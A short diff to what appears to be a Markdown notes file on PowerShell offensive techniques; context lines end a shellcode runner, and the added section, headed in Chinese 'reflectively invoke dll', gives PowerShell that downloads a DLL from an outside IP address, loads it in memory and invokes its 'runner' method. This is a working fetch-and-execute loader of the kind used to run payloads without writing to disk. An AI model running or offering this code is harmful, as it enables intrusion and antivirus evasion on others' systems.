@@ -118,3 +118,13 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
 ```
 
+反射调用dll
+
+```
+$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ClassLibrary1.dll')
+
+$assem = [System.Reflection.Assembly]::Load($data)
+$class = $assem.GetType("ClassLibrary1.Class1")
+$method = $class.GetMethod("runner")
+$method.Invoke(0, $null)
+```
